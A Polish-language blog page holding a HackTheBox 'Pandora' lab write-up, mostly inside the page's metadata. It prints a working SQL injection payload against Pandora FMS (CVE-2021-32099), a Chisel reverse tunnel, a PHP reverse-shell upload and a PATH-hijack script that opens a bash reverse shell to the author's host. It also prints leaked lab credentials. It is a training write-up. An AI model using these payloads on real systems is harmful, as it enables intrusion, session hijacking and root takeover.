<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Pandora - HackTheBox | Mateusz Suszczyk</title>
<meta name="keywords" content="Linux, Easy, Retired" />
<meta name="description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://suszczyk.github.io/posts/hackthebox/pandora/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Pandora - HackTheBox" />
<meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suszczyk.github.io/posts/hackthebox/pandora/" />
<meta property="og:image" content="https://suszczyk.github.io/thumbnails/Pandora.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-02T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-02-02T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/Pandora.jpg" />
<meta name="twitter:title" content="Pandora - HackTheBox"/>
<meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://suszczyk.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Pandora - HackTheBox",
      "item": "https://suszczyk.github.io/posts/hackthebox/pandora/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pandora - HackTheBox",
  "name": "Pandora - HackTheBox",
  "description": "Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup\u0026rsquo;em :)",
  "keywords": [
    "Linux", "Easy", "Retired"
  ],
  "articleBody": "Pandora - 02.02.2022  Adres IP Pandora: 10.10.11.136 Adres IP mojego Linuxa: 10.10.14.224\nNMap ┌──(kali㉿kali)-[~/htb/pandora] └─$ nmap -sC -sV panda.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 21:57 CET Nmap scan report for panda.htb (10.10.11.136) Host is up (0.089s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds  FeroxBuster oraz Nikto nie wykazały niczego wartego uwagi.\nStrona główna Na stronie dostrzegam Panda.HTB, zatem dodaję odpowiedni wpis 10.10.11.136 panda.htb do /etc/hosts.\n BurpSuite Na stronie jest aktywny formularz.\nPróbowałem różnych sposobów, ale bez skutku.\n Postanowiłem sprawdzić jeszcze porty UDP.\nNmap UDP ┌──(kali㉿kali)-[~/htb/pandora] └─$ sudo nmap -sU 10.10.11.136 1 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-31 01:34 CET Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 0.80% done Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 1.73% done; ETC: 01:38 (0:03:47 remaining) Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 17.74% done; ETC: 01:50 (0:13:18 remaining) Nmap scan report for panda.htb (10.10.11.136) Host is up (0.054s latency). Not shown: 999 closed ports PORT STATE SERVICE 161/udp open|filtered snmp Mamy otwarty port 161.\n Ukryty port 161 - SNMP Narzędziem snmp-check można przeprowadzić enumerację usługi SNMP. Tutaj między wieloma linijkami dostrzegłem coś nietypowego.\n┌──(kali㉿kali)-[~/htb/pandora] └─$ snmp-check 10.10.11.136 -c public ... 843 runnable sh /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23' ... Mamy potencjalne dane logowania:\ndaniel:HotelBabylon23\nUdało mi się zalogować z użyciem tych danych.\nssh daniel@10.10.11.136 HotelBabylon23  Drugi user - matt Na maszynie jest również drugi user i to na niego należy się dostać, aby odczytać flagę user.txt\nAnalizując od wewnątrz skryptem linpeas.sh znalazłem sporo wektorów:\n Folder z prawami dla użytkownika matt  /var/www/pandora Podejrzany SUID?  -rwsr-x--- 1 root matt 17K Dec 3 15:58 /usr/bin/pandora_backup (Unknown SUID binary) Plik api.php - możliwe, że istnieje jakieś API.   Wygląda na to, że to Pandora FMS (oprogramowanie do monitorowania sieci komputerowych).\nDostęp do pliku konfiguracyjnego config.php jest zablokowany.\ndaniel@pandora:/var/www/pandora/pandora_console/include$ cat config.php cat: config.php: Permission denied Po małym researchu w Google znalazłem adres na API:\nhttp://127.0.0.1/pandora_console/include/api.php Sprawdzam prostym zapytaniem curl działanie API.\ncurl \"http://127.0.0.1/pandora_console/include/api.php?op=get\u0026op2=plugins\u0026return_type=csv\u0026other=;\u0026apipass=1234\u0026user=admin\u0026pass=pandora\" Po takim wywołaniu otrzymuję auth error, czyli API odpowiada.\n Chisel Tutaj pomocne będzie narzędzie Chisel, które pozwoli na działanie na naszej przeglądarce mimo, że cała infrastruktura Pandory jest na wewnętrznej sieci maszyny.\nUstawiam serwer na moim Linuxie, który nasłuchuje na porcie 8001:\nchisel server --reverse -p 8001 Klienta ustawiam na Pandorze na użytkowniku matt:\n./chisel client 10.10.14.224:8001 R:8000:127.0.0.1:80 Czyli łączę się po 10.10.14.224 z moim Linuxem na porcie 8001, a następnie przekierowuję ruch na port 8000 a 127.0.0.1:80 to adres na który chcę się dostać.\nI tym sposobem otrzymuję panel logowania. Teraz mogę przystąpić do prób łamania.\nJak się okazuje, jest to wersja v7.0NG.742_FIX_PERL2020. Szybki research daje nadzieje na jakieś podatności.\nJest RCE, potrzebujemy jeszcze użytkownika i hasło https://www.exploit-db.com/exploits/47898\nPróbowałem różnych kombinacji jeżeli chodzi o panel logowania, ale nic nie działało. Natomiast, gdy spróbowałem kombinację daniel:HotelBabylon23, którą użyliśmy do logowania na SSH, pojawił się inny komunikat.\nKomunikat przy “zwykłej” kombinacji: Komunikat po daniel:HotelBabylon23: Ok, tutaj bardzo pomocny okazał się wpis na pewnym blogu. https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained\nNajwiększą luką w tej Pandorze jest SQL Injection (pre authentication) (CVE-2021-32099) i po chwili researchu znalazłem z jakiegoś powodu usuniętego exploita na Githubie. Poradziłem sobie przez Google Cache.\nhttps://webcache.googleusercontent.com/search?q=cache:https://github.com/nikn0laty/CVE-2021-32099_exploit\n Exploit ┌──(kali㉿kali)-[~/htb/pandora] └─$ curl -d \"session_id=666' UNION SELECT 1,2,data FROM tsessions_php WHERE data LIKE '%matt%' -- xxx\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Cookie: PHPSESSID=mk92cuv4lllsta4b2stc4ak21k\" -X POST http://127.0.0.1:8000/pandora_console/include/chart_generator.php Odpowiedź:\nDOCTYPE html head meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" / titlePandora FMS Graph ( - )title link rel=\"stylesheet\" href=\"styles/pandora.css\" type=\"text/css\" / link rel=\"stylesheet\" href=\"styles/pandora_minimal.css\" type=\"text/css\" / link rel=\"stylesheet\" href=\"styles/js/jquery-ui.min.css\" type=\"text/css\" / link rel=\"stylesheet\" href=\"styles/js/jquery-ui_custom.css\" type=\"text/css\" / script language=\"javascript\" type='text/javascript' src='javascript/pandora.js'script script language=\"javascript\" type='text/javascript' src='javascript/jquery-3.3.1.min.js'script script language=\"javascript\" type='text/javascript' src='javascript/jquery.pandora.js'script script language=\"javascript\" type='text/javascript' src='javascript/jquery-ui.min.js'script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.time.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.pie.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.crosshair.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.stack.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.selection.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.resize.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.threshold.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.threshold.multiple.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.symbol.min.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.exportdata.pandora.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/jquery.flot.axislabels.js\"script script language=\"javascript\" type=\"text/javascript\" src=\"graphs/flot/pandora.flot.js\"script head body bgcolor=\"#ffffff\" style='background:#ffffff;' divdiv script type=\"text/javascript\" $('document').ready(function () { setTimeout(function () { try { var status = window.callPhantom({ status: \"loaded\" }); } catch (error) { console.log(\"CALLBACK ERROR\", error.message) } }, 100); }); script body html Odpowiedź wskazuję na powodzenie exploitu, po wklejeniu id ciasteczka do przeglądarki mk92cuv4lllsta4b2stc4ak21k, otrzymałem zalogowany panel Pandory.\nPandora FMS Graph ( - ) Pandora FMS v7.0NG.742_FIX_PERL2020 - Build PC200103 - MR 34\nW tym momencie znalazłem kolejny link do Githuba z możliwością wykorzystania błędu z SQL Injection.\nhttps://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py\nPayload: http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:\"admin\";' as data -- SgGO\nI w tym momencie mamy dostęp do konta admina. Próbowałem wrzucić reverse-shell.php bezpośrednio na serwer, ale modyfikując pewne parametry w BurpSuite, ale nic nie chciało zadziałać. Wspomogłem się filmikiem, na którym jest przedstawiony podobny problem. Tutaj użytkownik spakował shell.php do zipa i taki plik wrzucił na serwer. Ten przyjął zipa i wypakował go do ścieżki http://127.0.0.1:8000/pandora_console/extensions/ https://www.youtube.com/watch?v=KX_jZsdgsJE\nPo uruchomieniu pliku na serwerze. Dostałem przekierowanie. W taki sposób otrzymałem shella na użytkowniku matt.\nuser.txt 3ad61bc0b475100ae5f2de64e3229de3\nWylistowałem również plik config.php, który wcześniej był niedostępny z nadzieją, że hasło, które się tutaj znajduje to również hasło na użytkownika matt, jednak tak nie było.\ncat config.php [\"dbtype\"] = \"mysql\"; $config[\"dbname\"]=\"pandora\"; $config[\"dbuser\"]=\"pandora\"; $config[\"dbpass\"]=\"PandoraFMSSecurePass2021\"; $config[\"dbhost\"]=\"localhost\"; $config[\"homedir\"]=\"/var/www/pandora/pandora_console\"; $config[\"homeurl\"]=\"/pandora_console\"; error_reporting(0); $ownDir = dirname(__FILE__) . '/'; include ($ownDir . \"config_process.php\"); ?  Privilege Escalation Po uruchomieniu skryptu Linpeas ponownie zauważyłem podejrzany SUID.\nmatt - SSH Niestety nie mogłem go uruchomić tak po prostu. Potrzebowałem bardziej stablinego shella np. poprzez SSH. Dodałem swój klucz publiczny SSH na maszynę na użytkownika matt, dzięki czemu mogłem dalej spokojnie pracować. Poniżej kod, którym to zrobiłem:\nmkdir .ssh chmod 700 .ssh cd .ssh echo \"ssh-rsa PUBLIC KEY ...\"  authorized_keys chmod 600 authorized_keys ssh matt@panda.htb Przesłałem sobie również plik pandora_backup poleceniem netcat -l 1234  pandora(u mnie) oraz netcat -w 2 10.10.14.224 1234 (na maszynie HTB). Przeanalizowałem plik poprzez strings.\nWidać, że program pakuje wszystkie pliki z folderu pandora_console do .backup. Na tym etapie próbowałem eskalacji poprzez tricki z wildcardem. Niestety nie udało mi się to, po dłuższym googlowaniu okazało się, że mogę wykorzystać zmienną $PATH.\n $PATH Privileges Escalation Oryginalna zmienna $PATH jest taka:\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin I teraz skoro w skrypcie powyżej mamy tar,który jest wykonywany z uprawnieniami roota, możemy to wykorzystać tworząc swoją wersję binarki tar.\nW folderze domowym stworzyłem plik tar.\nvim tar #!/bin/bash bash -i \u0026 /dev/tcp/10.10.14.224/4444 0\u00261 Następnie nadpisałem zmienną $PATH, dzięki czemu najpierw uruchomi się tar znajdujący się w lokalizacji /home/matt a nie /usr/bin.\nexport PATH=/home/matt:$PATH cat $PATH /home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin Teraz po uruchomieniu pliku:\nmatt@pandora:/usr/bin$ ./pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client Otrzymałem połączenie w drugim oknie.\nroot.txt 633258941d13876030f539c90c7322d0\n",
  "wordCount" : "1190",
  "inLanguage": "en",
  "image":"https://suszczyk.github.io/thumbnails/Pandora.jpg","datePublished": "2022-02-02T00:00:00Z",
  "dateModified": "2022-02-02T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://suszczyk.github.io/posts/hackthebox/pandora/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Mateusz Suszczyk",
    "logo": {
      "@type": "ImageObject",
      "url": "https://suszczyk.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Pandora - HackTheBox
    </h1>
    <div class="post-meta"><span title='2022-02-02 00:00:00 +0000 UTC'>February 2, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Mateusz Suszczyk

</div>
  </header> 
<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/Pandora.jpg" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#pandora---02022022" aria-label="Pandora - 02.02.2022">Pandora - 02.02.2022</a></li>
                <li>
                    <a href="#nmap" aria-label="NMap">NMap</a></li>
                <li>
                    <a href="#strona-g%c5%82%c3%b3wna" aria-label="Strona główna">Strona główna</a><ul>
                        
                <li>
                    <a href="#burpsuite" aria-label="BurpSuite">BurpSuite</a></li></ul>
                </li>
                <li>
                    <a href="#nmap-udp" aria-label="Nmap UDP">Nmap UDP</a></li>
                <li>
                    <a href="#ukryty-port-161---snmp" aria-label="Ukryty port 161 - SNMP">Ukryty port 161 - SNMP</a></li>
                <li>
                    <a href="#drugi-user---matt" aria-label="Drugi user - matt">Drugi user - matt</a><ul>
                        
                <li>
                    <a href="#chisel" aria-label="Chisel">Chisel</a><ul>
                        
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
                        
                <li>
                    <a href="#matt---ssh" aria-label="matt - SSH">matt - SSH</a></li>
                <li>
                    <a href="#path-privileges-escalation" aria-label="$PATH Privileges Escalation">$PATH Privileges Escalation</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="pandora---02022022">Pandora - 02.02.2022<a hidden class="anchor" aria-hidden="true" href="#pandora---02022022">#</a></h1>
<hr>
<p>Adres IP Pandora: <code>10.10.11.136</code>
Adres IP mojego Linuxa: <code>10.10.14.224</code></p>
<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/pandora<span style="color:#f92672">]</span>
└─$ nmap -sC -sV panda.htb   
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-01-30 21:57 CET
Nmap scan report <span style="color:#66d9ef">for</span> panda.htb <span style="color:#f92672">(</span>10.10.11.136<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.089s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.06 seconds
</code></pre></div><hr>
<p>FeroxBuster oraz Nikto nie wykazały niczego wartego uwagi.</p>
<h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220130214850.png" alt=""  />
</p>
<p>Na stronie dostrzegam <code>Panda.HTB</code>, zatem dodaję odpowiedni wpis <code>10.10.11.136 panda.htb</code> do <code>/etc/hosts</code>.</p>
<hr>
<h2 id="burpsuite">BurpSuite<a hidden class="anchor" aria-hidden="true" href="#burpsuite">#</a></h2>
<p>Na stronie jest aktywny formularz.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131011935.png" alt=""  />
</p>
<p>Próbowałem różnych sposobów, ale bez skutku.</p>
<hr>
<p>Postanowiłem sprawdzić jeszcze porty UDP.</p>
<h1 id="nmap-udp">Nmap UDP<a hidden class="anchor" aria-hidden="true" href="#nmap-udp">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/pandora<span style="color:#f92672">]</span>
└─$ sudo nmap -sU 10.10.11.136                                                                                   <span style="color:#ae81ff">1</span> ⨯
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-01-31 01:34 CET
Stats: 0:00:00 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
UDP Scan Timing: About 0.80% <span style="color:#66d9ef">done</span>
Stats: 0:00:03 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
UDP Scan Timing: About 1.73% <span style="color:#66d9ef">done</span>; ETC: 01:38 <span style="color:#f92672">(</span>0:03:47 remaining<span style="color:#f92672">)</span>
Stats: 0:02:51 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
UDP Scan Timing: About 17.74% <span style="color:#66d9ef">done</span>; ETC: 01:50 <span style="color:#f92672">(</span>0:13:18 remaining<span style="color:#f92672">)</span>
Nmap scan report <span style="color:#66d9ef">for</span> panda.htb <span style="color:#f92672">(</span>10.10.11.136<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">999</span> closed ports
PORT    STATE         SERVICE
161/udp open|filtered snmp
</code></pre></div><p>Mamy otwarty port 161.</p>
<hr>
<h1 id="ukryty-port-161---snmp">Ukryty port 161 - SNMP<a hidden class="anchor" aria-hidden="true" href="#ukryty-port-161---snmp">#</a></h1>
<p>Narzędziem <code>snmp-check</code> można przeprowadzić enumerację usługi SNMP. Tutaj między wieloma linijkami dostrzegłem coś nietypowego.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/pandora<span style="color:#f92672">]</span>                                                                                                                                                                                                             
└─$ snmp-check 10.10.11.136 -c public

...


<span style="color:#ae81ff">843</span>                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c <span style="color:#e6db74">&#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;</span>


...
</code></pre></div><p>Mamy potencjalne dane logowania:</p>
<p><code>daniel:HotelBabylon23</code></p>
<p>Udało mi się zalogować z użyciem tych danych.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh daniel@10.10.11.136
HotelBabylon23
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131032116.png" alt=""  />
</p>
<hr>
<h1 id="drugi-user---matt">Drugi user - matt<a hidden class="anchor" aria-hidden="true" href="#drugi-user---matt">#</a></h1>
<p>Na maszynie jest również drugi user i to na niego należy się dostać, aby odczytać flagę user.txt</p>
<p>Analizując od wewnątrz skryptem <code>linpeas.sh</code> znalazłem sporo wektorów:</p>
<ol>
<li>Folder z prawami dla użytkownika <code>matt</code></li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/www/pandora
</code></pre></div><ol start="2">
<li>Podejrzany SUID?</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rwsr-x--- <span style="color:#ae81ff">1</span> root matt 17K Dec  <span style="color:#ae81ff">3</span> 15:58 /usr/bin/pandora_backup <span style="color:#f92672">(</span>Unknown SUID binary<span style="color:#f92672">)</span>
</code></pre></div><ol start="3">
<li>Plik api.php - możliwe, że istnieje jakieś API.</li>
</ol>
<hr>
<p>Wygląda na to, że to <code>Pandora FMS</code> (oprogramowanie do monitorowania sieci komputerowych).</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220131033451.png" alt=""  />
</p>
<p>Dostęp do pliku konfiguracyjnego <code>config.php</code> jest zablokowany.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">daniel@pandora:/var/www/pandora/pandora_console/include$ cat config.php
cat: config.php: Permission denied
</code></pre></div><p>Po małym researchu w Google znalazłem adres na API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://127.0.0.1/pandora_console/include/api.php
</code></pre></div><p>Sprawdzam prostym zapytaniem <code>curl</code> działanie API.</p>
